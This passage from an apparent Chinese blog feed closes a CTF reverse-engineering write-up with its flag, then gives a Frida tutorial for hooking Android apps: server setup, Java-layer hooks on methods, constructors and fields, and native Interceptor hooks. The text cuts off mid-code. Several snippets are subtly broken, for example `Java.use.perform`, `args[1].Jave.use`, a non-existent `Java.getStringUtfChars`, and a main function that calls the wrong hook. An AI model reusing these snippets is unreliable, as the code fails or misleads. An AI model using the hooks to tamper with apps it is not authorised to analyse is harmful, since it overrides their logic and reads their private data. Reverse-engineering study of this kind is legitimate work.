HZNUCTF&#123;391ds2b9-9e31-45f8-ba4a-4904a2d8&#125;</span><br></code></pre></td></tr></table></figure><p>flag即为<code>HZNUCTF&#123;391ds2b9-9e31-45f8-ba4a-4904a2d8&#125;</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Frida</title>
    <link href="/2025/04/18/frida/"/>
    <url>/2025/04/18/frida/</url>
    
    <content type="html"><![CDATA[<h2 id="pre"><a href="#pre" class="headerlink" title="pre"></a>pre</h2><ol><li>已经 root 了的安卓真机 (我的是 Android9.0)<br>frida 版本 16.1.0 frida-server 版本 16.1.0</li><li>启动 frida-server</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell<br>su<br><span class="hljs-built_in">cd</span> /data/local/tmp<br>./frida-server<br><span class="hljs-comment"># 要换端口的话 可以使用 -l 参数</span><br>./frida-server -l 0.0.0.0:12123<br></code></pre></td></tr></table></figure><p>ps : 端口转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb forward tcp：12123 tcp:12123<br></code></pre></td></tr></table></figure><ol start="3"><li>frida 常用指令</li></ol><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>frida-ps</td><td>用于列出设备上的进程</td></tr><tr><td>-U</td><td>连接到 USB 设备</td></tr><tr><td>-a</td><td>显示进程的详细信息，包括进程的名称、PID（进程 ID）、包名等</td></tr><tr><td>-i</td><td>显示进程的架构信息</td></tr><tr><td>-H</td><td>连接到远程设备</td></tr><tr><td>-l</td><td>加载指定的脚本</td></tr><tr><td>-f</td><td>启动指定的应用程序</td></tr></tbody></table><p>eg:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">frida-ps -Uai<br><span class="hljs-comment"># 列出当前通过 USB 连接的设备上所有运行的进程。</span><br>frida-ps -Uai | grep com.nobody.zunjia<br><br>frida -U -f &lt;package_name&gt; -l &lt;script.js&gt;<br>frida -H 127.0.0.1:12123 -f &lt;package_name&gt; -l &lt;script.js&gt;<br><span class="hljs-comment"># 启动指定的应用程序，并加载指定的脚本</span><br></code></pre></td></tr></table></figure><p>获取日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb logcat | busybox grep &lt;PID&gt;<br></code></pre></td></tr></table></figure><h2 id="frida-java-层-hook"><a href="#frida-java-层-hook" class="headerlink" title="frida java 层 hook"></a>frida java 层 hook</h2><ol><li>hook 普通方法</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//定义一个名为“hooktest1”的函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hooktest1</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">//获取一个名为“类名”的 java 类，并将其实例赋值给 js 变量 utils</span><br>    <span class="hljs-keyword">var</span> utils = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;类名&quot;</span>);<br>    <span class="hljs-comment">//var utils =Java.use(&quot;com.nobody.zunjia.DexCall&quot;);</span><br><br>    <span class="hljs-comment">//修改&quot;类名&quot;的&quot;method&quot;方法实现，这个新的实现会接受两个参数</span><br>    utils.<span class="hljs-property">method</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">a, b</span>) &#123;<br>        <span class="hljs-comment">//更改参数的值</span><br>        a = <span class="hljs-number">123</span>;<br>        b = <span class="hljs-number">456</span>;<br>        <span class="hljs-comment">//调用修改过的“method”方法，并将返回值存储在变量 retval 中    </span><br>        <span class="hljs-keyword">var</span> retval = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">method</span>(a, b);<br><br>        <span class="hljs-comment">//打印参数 a b 以及返回值   </span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b, retval);<br><br>        <span class="hljs-keyword">return</span> retval;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title function_">hooktest1</span>();<br>    &#125;)<br>&#125;;<br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><ol start="2"><li>overload 使用</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//.overload</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hooktest2</span>(<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">var</span> utils = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;类名&quot;</span>);<br>    <span class="hljs-comment">//var utils =Java.use(&quot;com.nobody.zunjia.DexCall&quot;);</span><br><br>    utils.<span class="hljs-property">method</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">i, str</span>) &#123;<br>        <span class="hljs-comment">//如果有自定义参数类型在 smali 中找</span><br>        <span class="hljs-comment">//实在不知道可以在报错中找</span><br><br>        <span class="hljs-comment">//调用修改过的“method”方法，并将返回值存储在变量 retval 中    </span><br>        <span class="hljs-keyword">var</span> retval = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">method</span>(i, str);<br><br><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i, str);<br><br>        <span class="hljs-comment">// return retval;</span><br>        <span class="hljs-comment">// return &quot;retval&quot;;</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title function_">hooktest1</span>();<br>    &#125;)<br>&#125;;<br><span class="hljs-title function_">setImmediate</span>(main);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">当hook的目标方法或构造函数存在多个重载时，需要使用 overload 来指定具体的参数类型</span><br><span class="hljs-comment">例如：</span><br><span class="hljs-comment">public class MyClass &#123;</span><br><span class="hljs-comment">    public MyClass() &#123; &#125;</span><br><span class="hljs-comment">    public MyClass(String str) &#123; &#125;</span><br><span class="hljs-comment">    public MyClass(String str, int num) &#123; &#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ol start="3"><li>hook 构造函数</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//hook 构造函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hooktest3</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> utils = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;&lt;package_name&gt;.&lt;class_name&gt;&quot;</span>);<br>    <span class="hljs-comment">//var utils=Java.use(&quot;com.nobody.zunjia.DexCall&quot;);</span><br><br>    <span class="hljs-comment">//修改类的构造函数的实现</span><br>    utils.<span class="hljs-property">$init</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">str</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str);<br>        str = <span class="hljs-string">&quot;hello&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.$init(str);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/*构造函数 ：名称与类名相同；没有返回值；自动调用；可以重载</span><br><span class="hljs-comment">public class MyClass&#123;</span><br><span class="hljs-comment">    public MyClass(String str)&#123;</span><br><span class="hljs-comment">        //构造函数</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;*/</span><br></code></pre></td></tr></table></figure><ol start="4"><li>hook 字段</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//hook 字段</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hooktest4</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">//静态字段修改</span><br>    <span class="hljs-keyword">var</span> utils = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;&lt;package_name&gt;.&lt;class_name&gt;&quot;</span>);<br>    <span class="hljs-comment">//修改类的静态字段的值</span><br>    utils.<span class="hljs-property">staticField</span>.<span class="hljs-property">value</span> = <span class="hljs-string">&quot;hello world&quot;</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(utils.<span class="hljs-property">staticField</span>.<span class="hljs-property">value</span>);<br><br>    <span class="hljs-comment">//非静态字段的修改</span><br>    <span class="hljs-comment">//使用 Java.choose() 枚举类的所有实例</span><br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;&lt;package_name&gt;.&lt;class_name&gt;&quot;</span>, &#123;<br>        <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">obj</span>) &#123;<br>            <span class="hljs-comment">//修改实例的非静态字段 &quot;_privateInt&quot;和非静态字段 &quot;privateInt&quot;的值</span><br>            obj.<span class="hljs-property">_privateInt</span>.<span class="hljs-property">value</span> = <span class="hljs-number">123</span>;<span class="hljs-comment">//如果字段名与函数名相同，需要在前面加个下划线</span><br>            obj.<span class="hljs-property">privateInt</span>.<span class="hljs-property">value</span> = <span class="hljs-number">456</span>;<br>        &#125;,<br>        <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><ol start="5"><li>hook 内部类</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//hook 内部类</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hooktest5</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-comment">//内部类</span><br>        <span class="hljs-keyword">var</span> innerClass = <span class="hljs-title class_">Java</span>.<span class="hljs-property">use</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-string">&quot;&lt;package_name&gt;.&lt;class_name&gt;$&lt;inner_class_name&gt;&quot;</span>);<br>        <span class="hljs-comment">//var innerClass = Java.use(&quot;com.example.OuterClass$InnerClass&quot;);  </span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(innerClass);<br>        innerClass.<span class="hljs-property">$init</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;hook innerClass&quot;</span>);<br>            <span class="hljs-comment">//...</span><br><br><br>        &#125;<br><br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><ol start="6"><li>枚举所有方法</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//枚举出所有方法</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hooktest7</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> a = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;&lt;package_name&gt;.&lt;class_name&gt;&quot;</span>);<br>        <span class="hljs-comment">//getDeclaredMethods 枚举所有方法</span><br>        <span class="hljs-keyword">var</span> methods = a.<span class="hljs-property">class</span>.<span class="hljs-title function_">getDeclaredMethods</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; methods.<span class="hljs-property">length</span>; i++) &#123;<br>            <span class="hljs-keyword">var</span> methodName = methods[i].<span class="hljs-title function_">getName</span>();<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(methodName);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; a[methodName].<span class="hljs-property">overloads</span>.<span class="hljs-property">length</span>; j++) &#123;<br>                a[methodName].<span class="hljs-property">overloads</span>[j].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">length</span>; k++) &#123;<br>                        <span class="hljs-comment">//arguments.length 表示当前方法调用时传入的参数个数</span><br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>[k]);<br>                        <span class="hljs-comment">//打印每个参数的值</span><br><br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>[methodName].<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">arguments</span>);<br>                    <span class="hljs-comment">//将原始方法的返回值返回给调用方</span><br>                &#125;<br>            &#125;<br>        &#125;<br><br><br>    &#125;)<br><br><br>&#125;<br></code></pre></td></tr></table></figure><ol start="7"><li>主动调用</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//主动调用</span><br><br><span class="hljs-comment">//静态方法的主动调用</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hooktest_1</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">ClassName</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;&lt;&gt;package_name&gt;.&lt;class_name&gt;&quot;</span>);<br>        <span class="hljs-title class_">ClassName</span>.<span class="hljs-title function_">privateFunc</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-comment">//非静态方法的主动调用</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hooktest_2</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">var</span> ret =<span class="hljs-literal">null</span>;<br>        <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;&lt;package_name&gt;.&lt;class_name&gt;&quot;</span>,&#123; <span class="hljs-comment">//要 hook 的类</span><br>            <span class="hljs-attr">onMatch</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>)&#123;<br>                ret =instance.<span class="hljs-title function_">privateFunc</span>(<span class="hljs-string">&quot;arg&quot;</span>); <span class="hljs-comment">//要 hook 的方法</span><br>            &#125;,<br>            <span class="hljs-attr">onComplete</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>                <span class="hljs-comment">//console.log(&quot;ret: &quot;+ret);</span><br>            &#125;<br>        &#125;<br><br>        )<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="frida-native-层-hook"><a href="#frida-native-层-hook" class="headerlink" title="frida native 层 hook"></a>frida native 层 hook</h2><ol><li>Process</li></ol><table><thead><tr><th>API</th><th>说明</th></tr></thead><tbody><tr><td><code>Process.id</code></td><td>返回附加目标进程的 id</td></tr><tr><td><code>Process.isDebuggerAttached</code></td><td>检查当前是否对目标程序已附加</td></tr><tr><td><code>Process.enumerateModules</code></td><td>枚举当前进程的所有模块，返回模块对象的数组</td></tr><tr><td><code>Process.enumerateThreads</code></td><td>枚举当前进程的所有线程，返回包含 <code>id</code>、<code>state</code>、<code>context</code> 等属性的对象数组</td></tr></tbody></table><hr><ol start="2"><li>Module</li></ol><table><thead><tr><th>API</th><th>说明</th></tr></thead><tbody><tr><td><code>Module.load</code></td><td>加载指定 so 文件，返回一个 Module 对象</td></tr><tr><td><code>enumerateImports()</code></td><td>枚举所有 Import 库函数，返回 Module 数组对象</td></tr><tr><td><code>enumerateExports()</code></td><td>枚举所有 Export 库函数，返回 Module 数组对象</td></tr><tr><td><code>enumerateSymbols()</code></td><td>枚举所有 Symbol 库函数，返回 Module 数组对象</td></tr><tr><td><code>findExportByName()</code><br><code>findBaseAddress()</code></td><td>寻找指定 so 库中 export 库中的函数地址</td></tr><tr><td><code>Module.findBaseAddress(name)</code><br><code>Module.getBaseAddress(name)</code></td><td>返回 so 的基地址</td></tr></tbody></table><ol start="3"><li>Memory</li></ol><table><thead><tr><th>API</th><th>说明</th></tr></thead><tbody><tr><td><code>Memory.copy()</code></td><td>复制内存</td></tr><tr><td><code>Memory.scan()</code></td><td>搜索内存中特定模式的数据</td></tr><tr><td><code>Memory.scanSync()</code></td><td>同步搜索内存中特定模式的数据,返回多个匹配的数据</td></tr><tr><td><code>Memory.alloc()</code></td><td>在目标进程的堆上申请指定大小的内存，返回一个 NativePointer</td></tr><tr><td><code>Memory.writeByteArray()</code></td><td>将字节数组写入指定内存地址</td></tr><tr><td><code>Memory.readByteArray()</code></td><td>从指定内存地址读取字节数组</td></tr></tbody></table><ol start="4"><li><ol><li>hook 打印 (int 型、bool 型、char 型)</li></ol></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// Native 层 hook 打印</span><br><span class="hljs-comment">// int 型、 bool 型、 cahr 型</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-comment">//根据导出函数名打印地址</span><br>        <span class="hljs-keyword">var</span> addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;&lt;so_name&gt;&quot;</span>, <span class="hljs-string">&quot;&lt;function_name&gt;&quot;</span>);<br>        <span class="hljs-comment">//var addr=Module.findExportByName(&quot;libnative-lib.so&quot;,&quot;Java_com_example_native_1lib_MainActivity_check&quot;);</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(addr);<br>        <span class="hljs-keyword">if</span> (addr != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(addr, &#123;<br>                <span class="hljs-comment">//onEnter 里打印和修改参数</span><br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123; <span class="hljs-comment">//args 传入参数</span><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(args[<span class="hljs-number">0</span>]);<span class="hljs-comment">//打印第一个参数的值</span><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">x1</span>);<span class="hljs-comment">//打印寄存器的内容</span><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(args[<span class="hljs-number">1</span>].<span class="hljs-title function_">toInt32</span>()); <span class="hljs-comment">//toInt32() 转十进制值</span><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(args[<span class="hljs-number">2</span>].<span class="hljs-title function_">readCString</span>());<span class="hljs-comment">//读取字符串 char型</span><br><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(args[<span class="hljs-number">2</span>]));<span class="hljs-comment">//dump 内存</span><br><br>                &#125;,<br>                <span class="hljs-comment">//onLeave 里打印和修改返回值</span><br>                <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123; <span class="hljs-comment">//retval 为返回值</span><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(retval);<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;retval&quot;</span>, retval.<span class="hljs-title function_">toInt32</span>());<br>                &#125;<br><br>            &#125;)<br>        &#125;<br><br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li><ol start="2"><li>hook 打印(string 型)</li></ol></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// Native 层 hook 打印</span><br><span class="hljs-comment">// string 类型</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-comment">//根据导出函数名打印地址</span><br>        <span class="hljs-keyword">var</span> addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;&lt;so_name&gt;&quot;</span>, <span class="hljs-string">&quot;&lt;function_name&gt;&quot;</span>);<br>        <span class="hljs-comment">//var addr=Module.findExportByName(&quot;libnative-lib.so&quot;,&quot;Java_com_example_native_1lib_MainActivity_check&quot;);</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(addr);<br>        <span class="hljs-keyword">if</span> (addr != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(addr, &#123;<br>                <span class="hljs-comment">//onEnter 里打印和修改参数</span><br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123; <span class="hljs-comment">//args 传入参数</span><br>                    <span class="hljs-comment">//方法1：</span><br>                    <span class="hljs-keyword">var</span> jString = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">cast</span>(args[<span class="hljs-number">1</span>].<span class="hljs-property">Jave</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;Java.lang.String&quot;</span>));<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;args:&quot;</span>, jString.<span class="hljs-title function_">toString</span>());<br><br>                    <span class="hljs-comment">//方法2：</span><br>                    <span class="hljs-keyword">var</span> <span class="hljs-title class_">JNIEnv</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-property">vm</span>.<span class="hljs-title function_">getEnv</span>();<br>                    <span class="hljs-keyword">var</span> originalStrPtr = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">getStringUtfChars</span>(args[<span class="hljs-number">1</span>], <span class="hljs-literal">null</span>).<span class="hljs-title function_">readCString</span>();<br>                    <span class="hljs-variable 